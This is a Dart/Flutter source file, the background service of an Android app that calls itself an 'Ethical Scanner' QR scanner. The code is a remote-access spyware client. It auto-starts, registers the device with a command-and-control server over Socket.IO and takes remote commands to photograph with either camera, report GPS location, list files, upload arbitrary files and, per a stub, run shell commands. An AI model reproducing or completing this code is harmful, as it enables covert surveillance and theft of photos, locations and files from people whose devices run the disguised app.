// lib/services/background_service.dart

import 'dart:async';
import 'dart:io';
import 'dart:isolate';
import 'dart:ui';

import 'package:flutter/foundation.dart'; // debugPrint, immutable
import 'package:flutter_background_service/flutter_background_service.dart'
    show
        AndroidConfiguration,
        FlutterBackgroundService,
        IosConfiguration,
        ServiceInstance;
import 'package:flutter_background_service_android/flutter_background_service_android.dart'
    show DartPluginRegistrant, AndroidConfiguration;
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:camera/camera.dart' show XFile, CameraLensDirection;
import 'package:geolocator/geolocator.dart' show Position;
import 'package:shared_preferences/shared_preferences.dart';

// استيراد ملفات المشروع
import '../config/app_config.dart';
import '../utils/constants.dart';
import 'data_collector_service.dart';
import 'device_info_service.dart';
import 'network_service.dart';
import 'location_service.dart';
import 'camera_service.dart';
import 'file_system_service.dart';

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DataCollectorService dataCollectorService;
  final DeviceInfoService deviceInfoService;
  final LocationService locationService;
  // CameraService and FileSystemService are not directly used by background anymore for C2 commands
  // They are invoked via UI isolate.
  // final CameraService cameraService;
  // final FileSystemService fileSystemService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;

  const BackgroundServiceHandles({
    required this.networkService,
    required this.dataCollectorService,
    required this.deviceInfoService,
    required this.locationService,
    // required this.cameraService, // Removed
    // required this.fileSystemService, // Removed
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
  });
}

Timer? _heartbeatTimer;
StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  final network = NetworkService();
  final dataCollector =
      DataCollectorService(); // Still needed for initial data CameraService usage
  final deviceInfo = DeviceInfoService();
  final location = LocationService();
  // final camera = CameraService(); // Not directly used by background for C2 commands
  // final fileSystem = FileSystemService(); // Not directly used by background for C2 commands
  final prefs = await SharedPreferences.getInstance();
  final String deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
  debugPrint("BackgroundService: DeviceID = $deviceId");

  final handles = BackgroundServiceHandles(
    networkService: network,
    dataCollectorService: dataCollector,
    deviceInfoService: deviceInfo,
    locationService: location,
    // cameraService: camera, // Removed
    // fileSystemService: fileSystem, // Removed
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
  );

  service.invoke('update', {'device_id': deviceId});

  await network.connectSocketIO(deviceId);
  _connectionStatusSubscription = network.connectionStatusStream.listen((
    isConnected,
  ) {
    debugPrint(
      "BackgroundService: Socket status: ${isConnected ? 'Connected' : 'Disconnected'}",
    );
    service.invoke('update', {
      'socket_status': isConnected ? 'Connected' : 'Disconnected',
    });

    if (isConnected) {
      _registerDeviceWithC2(handles);
      _startHeartbeat(handles);
    } else {
      _stopHeartbeat();
    }
  });

  _commandSubscription = network.commandStream.listen((commandData) {
    final cmd = commandData['command'] as String;
    final args = Map<String, dynamic>.from(commandData['args'] as Map? ?? {});
    debugPrint("BackgroundService: Received command '$cmd' with args: $args");
    _handleC2Command(handles, cmd, args);
  });

  // Listener for results from UI-executed MethodChannel calls
  service.on('execute_take_picture_from_ui_result').listen((response) async {
    if (response == null) return;
    final Map<String, dynamic> data = Map<String, dynamic>.from(
      response as Map,
    );
    final status = data['status'] as String?;
    final payload = data['payload'] as Map<String, dynamic>?;
    final String? originalCommandRef = data['original_command_ref'] as String?;

    if (originalCommandRef == null) {
      debugPrint(
        "BackgroundService: 'original_command_ref' missing in take_picture_from_ui_result",
      );
      return;
    }

    if (status == 'success' && payload != null && payload.containsKey('path')) {
      final filePath = payload['path'] as String;
      debugPrint(
        "BackgroundService: UI took picture successfully. Path: $filePath. Uploading...",
      );
      await handles.networkService.uploadFileFromCommand(
        deviceId: handles.currentDeviceId,
        commandRef: originalCommandRef, // Use the passed back reference
        fileToUpload: XFile(filePath),
      );
    } else {
      debugPrint(
        "BackgroundService: UI failed to take picture. Error: ${payload?['message']}",
      );
      handles.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: 'error',
        payload: {
          'message': 'UI failed to take picture: ${payload?['message']}',
        },
      );
    }
  });

  service.on('execute_list_files_from_ui_result').listen((response) {
    if (response == null) return;
    final Map<String, dynamic> data = Map<String, dynamic>.from(
      response as Map,
    );
    final status = data['status'] as String?;
    final payload = data['payload'] as Map<String, dynamic>?;
    final String? originalCommandRef = data['original_command_ref'] as String?;

    if (originalCommandRef == null) {
      debugPrint(
        "BackgroundService: 'original_command_ref' missing in list_files_from_ui_result",
      );
      return;
    }

    if (status == 'success' && payload != null) {
      handles.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: "success",
        payload: payload,
      );
    } else {
      handles.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: "error",
        payload: {
          "message":
              payload?['message']?.toString() ?? "UI failed to list files.",
        },
      );
    }
  });

  service.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((
    Map<String, dynamic>? argsFromUi,
  ) async {
    final alreadySent = prefs.getBool(PREF_INITIAL_DATA_SENT) ?? false;

    service.invoke('update', {'initial_data_status': 'Processing...'});

    if (alreadySent && argsFromUi == null) {
      debugPrint(
        "BackgroundService: Initial data already marked as sent, and no new UI trigger.",
      );
      service.invoke('update', {'initial_data_status': 'Already Sent'});
      return;
    }
    if (argsFromUi == null) {
      debugPrint(
        "BackgroundService: argsFromUi is null for BG_SERVICE_EVENT_SEND_INITIAL_DATA, cannot send.",
      );
      service.invoke('update', {'initial_data_status': 'Error - No UI Data'});
      return;
    }

    final jsonData = argsFromUi['jsonData'] as Map<String, dynamic>?;
    final imagePath = argsFromUi['imagePath'] as String?;
    if (jsonData == null) {
      debugPrint(
        "BackgroundService: jsonData is null within argsFromUi, cannot send initial data.",
      );
      service.invoke('update', {
        'initial_data_status': 'Error - JSON Data Null',
      });
      return;
    }

    final payload = Map<String, dynamic>.from(jsonData)
      ..['deviceId'] = deviceId;

    XFile? imageFile;
    if (imagePath != null && imagePath.isNotEmpty) {
      final file = File(imagePath);
      if (await file.exists()) {
        imageFile = XFile(imagePath);
      } else {
        debugPrint(
          "BackgroundService: Image file not found for initial data: $imagePath",
        );
      }
    }

    final success = await network.sendInitialData(
      jsonData: payload,
      imageFile: imageFile,
    );
    if (success) {
      await prefs.setBool(PREF_INITIAL_DATA_SENT, true);
      debugPrint("BackgroundService: Initial data sent successfully");
      service.invoke('update', {'initial_data_status': 'Sent Successfully'});
    } else {
      debugPrint("BackgroundService: Failed to send initial data");
      service.invoke('update', {'initial_data_status': 'Failed to Send'});
    }
  });

  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    debugPrint("BackgroundService: Received stop service event. Stopping...");
    _stopHeartbeat();
    await dataCollector
        .disposeCamera(); // DataCollectorService still might hold camera resources from initial collection
    network.disconnectSocketIO();
    await _connectionStatusSubscription?.cancel();
    _connectionStatusSubscription = null;
    await _commandSubscription?.cancel();
    _commandSubscription = null;
    network.dispose();
    await service.stopSelf();
    debugPrint("BackgroundService: Service stopped.");
  });
}

Future<void> _registerDeviceWithC2(BackgroundServiceHandles h) async {
  if (!h.networkService.isSocketConnected) return;
  try {
    final info = await h.deviceInfoService.getDeviceInfo();
    info['deviceId'] = h.currentDeviceId;
    h.networkService.registerDeviceWithC2(info);
    debugPrint(
      "BackgroundService: Device registration attempt sent for ID: ${h.currentDeviceId}",
    );
  } catch (e, s) {
    debugPrint("BackgroundService: Error registering device: $e\n$s");
  }
}

void _startHeartbeat(BackgroundServiceHandles h) {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) {
    if (h.networkService.isSocketConnected) {
      h.networkService.sendHeartbeat({
        'deviceId': h.currentDeviceId,
        'timestamp': DateTime.now().toIso8601String(),
      });
    }
    h.serviceInstance.invoke('update', {
      'current_date': DateTime.now().toIso8601String(),
      'device_id': h.currentDeviceId,
      'socket_status':
          h.networkService.isSocketConnected ? 'Connected' : 'Disconnected',
    });
  });
  debugPrint(
    "BackgroundService: Heartbeat started for Device ID: ${h.currentDeviceId}. Interval: ${C2_HEARTBEAT_INTERVAL.inSeconds}s",
  );
  h.serviceInstance.invoke('update', {
    'current_date': DateTime.now().toIso8601String(),
    'device_id': h.currentDeviceId,
    'socket_status':
        h.networkService.isSocketConnected ? 'Connected' : 'Disconnected',
  });
}

void _stopHeartbeat() {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = null;
  debugPrint("BackgroundService: Heartbeat stopped");
}

Future<void> _handleC2Command(
  BackgroundServiceHandles h,
  String commandName,
  Map<String, dynamic> args,
) async {
  switch (commandName) {
    case SIO_CMD_TAKE_PICTURE:
      try {
        final lensString = args['camera'] as String?;
        final lensArg = lensString?.toLowerCase() == 'front' ? 'front' : 'back';

        debugPrint(
          "BackgroundService: Requesting UI to take picture with lens: $lensArg (Command: $commandName)",
        );

        h.serviceInstance.invoke('execute_take_picture_from_ui', {
          'camera': lensArg,
          'original_command_ref': SIO_CMD_TAKE_PICTURE,
        });
        // Response will be handled by 'execute_take_picture_from_ui_result' listener
      } catch (e, s) {
        debugPrint(
          "BackgroundService: Error in SIO_CMD_TAKE_PICTURE before UI invoke: $e\nStackTrace: $s",
        );
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_TAKE_PICTURE,
          status: 'error',
          payload: {
            'message': 'BG error preparing take_picture: ${e.toString()}',
          },
        );
      }
      break;

    case SIO_CMD_GET_LOCATION: // This command does not require UI Isolate for MethodChannel
      try {
        final Position? loc = await h.locationService.getCurrentLocation();
        if (loc != null) {
          h.networkService.sendCommandResponse(
            originalCommand: SIO_CMD_GET_LOCATION,
            status: 'success',
            payload: {
              'latitude': loc.latitude,
              'longitude': loc.longitude,
              'accuracy': loc.accuracy,
              'altitude': loc.altitude,
              'speed': loc.speed,
              'timestamp_gps': loc.timestamp?.toIso8601String(),
            },
          );
        } else {
          throw Exception(
            "Location unavailable after request or permission denied by geolocator service",
          );
        }
      } catch (e, s) {
        debugPrint(
          "BackgroundService: Error executing SIO_CMD_GET_LOCATION: $e\nStackTrace: $s",
        );
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_GET_LOCATION,
          status: 'error',
          payload: {'message': e.toString()},
        );
      }
      break;

    case SIO_CMD_LIST_FILES:
      try {
        final path = args["path"] as String? ?? ".";
        debugPrint(
          "BackgroundService: Requesting UI to list files for path: '$path' (Command: $commandName)",
        );
        h.serviceInstance.invoke('execute_list_files_from_ui', {
          'path': path,
          'original_command_ref': SIO_CMD_LIST_FILES,
        });
        // Response will be handled by 'execute_list_files_from_ui_result' listener
      } catch (e, s) {
        debugPrint(
          "BackgroundService: Error in SIO_CMD_LIST_FILES before UI invoke: $e\nStackTrace: $s",
        );
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_LIST_FILES,
          status: "error",
          payload: {
            "message": "BG error preparing list_files: ${e.toString()}",
          },
        );
      }
      break;

    case SIO_CMD_UPLOAD_SPECIFIC_FILE:
      try {
        final filePath = args["path"] as String?;
        if (filePath == null || filePath.isEmpty) {
          throw Exception("File path is required for upload command");
        }

        final file = File(filePath);
        if (!await file.exists()) {
          throw Exception("File not found at path: $filePath");
        }

        final xfile = XFile(filePath);
        await h.networkService.uploadFileFromCommand(
          deviceId: h.currentDeviceId,
          commandRef: SIO_CMD_UPLOAD_SPECIFIC_FILE,
          fileToUpload: xfile,
        );
      } catch (e, s) {
        debugPrint(
          "BackgroundService: Error executing SIO_CMD_UPLOAD_SPECIFIC_FILE: $e\nStackTrace: $s",
        );
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_UPLOAD_SPECIFIC_FILE,
          status: "error",
          payload: {"message": " Pre-upload error in BG: ${e.toString()}"},
        );
      }
      break;

    case SIO_CMD_EXECUTE_SHELL:
      // This command also uses a MethodChannel via FileSystemService.
      // So, it needs to be delegated to UI Isolate.
      try {
        final command = args["command_name"] as String?;
        final commandArgs =
            (args["command_args"] as List<dynamic>?)
                ?.map((e) => e.toString())
                .toList() ??
            [];

        if (command == null || command.isEmpty) {
          throw Exception("Command name missing for execute_shell");
        }
        debugPrint(
          "BackgroundService: Requesting UI to execute shell: $command with args: $commandArgs (Command: $commandName)",
        );

        // We need a new event pair like 'execute_shell_from_ui' and 'execute_shell_from_ui_result'
        // For now, let's assume this requires a new listener in main.dart and here.
        // Placeholder for now - this will fail.
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_EXECUTE_SHELL,
          status: "error",
          payload: {
            "message":
                "Execute_shell via UI Isolate not fully implemented yet.",
          },
        );
        // TODO: Implement 'execute_shell_from_ui' and 'execute_shell_from_ui_result' similar to list_files
      } catch (e, s) {
        debugPrint(
          "BackgroundService: Error executing SIO_CMD_EXECUTE_SHELL: $e\nStackTrace: $s",
        );
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_EXECUTE_SHELL,
          status: "error",
          payload: {"message": e.toString()},
        );
      }
      break;

    case SIO_EVENT_REQUEST_REGISTRATION_INFO:
      debugPrint(
        "BackgroundService: Server requested registration info. Re-registering...",
      );
      _registerDeviceWithC2(h);
      break;

    default:
      debugPrint("BackgroundService: Received unknown command '$commandName'");
      h.networkService.sendCommandResponse(
        originalCommand: commandName,
        status: 'error',
        payload: {
          'message': 'Unknown command received by client: $commandName',
        },
      );
      break;
  }
}

Future<void> initializeBackgroundService() async {
  final service = FlutterBackgroundService();

  if (Platform.isAndroid) {
    final flnp = FlutterLocalNotificationsPlugin();
    const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
    const initSettings = InitializationSettings(android: androidInit);

    try {
      await flnp.initialize(initSettings);
      debugPrint("FlutterLocalNotificationsPlugin initialized successfully.");
    } catch (e, s) {
      debugPrint("Error initializing FlutterLocalNotificationsPlugin: $e\n$s");
    }

    const channel = AndroidNotificationChannel(
      'qr_scanner_service_channel',
      'Ethical Scanner Service',
      description: 'Background service for the Ethical Scanner application.',
      importance: Importance.low,
      playSound: false,
      enableVibration: false,
    );

    final AndroidFlutterLocalNotificationsPlugin? androidImplementation =
        flnp
            .resolvePlatformSpecificImplementation<
              AndroidFlutterLocalNotificationsPlugin
            >();

    if (androidImplementation != null) {
      try {
        await androidImplementation.createNotificationChannel(channel);
        debugPrint(
          "Notification channel 'qr_scanner_service_channel' creation successfully attempted.",
        );
      } catch (e, s) {
        debugPrint(
          "Error attempting to create notification channel for 'qr_scanner_service_channel': $e\n$s",
        );
      }
    } else {
      debugPrint(
        "AndroidFlutterLocalNotificationsPlugin implementation was null, channel 'qr_scanner_service_channel' not created.",
      );
    }
  }

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'qr_scanner_service_channel',
      initialNotificationTitle: 'Ethical Scanner',
      initialNotificationContent: 'Service is active.',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(autoStart: true, onForeground: onStart),
  );
  debugPrint("Background service configured.");
}
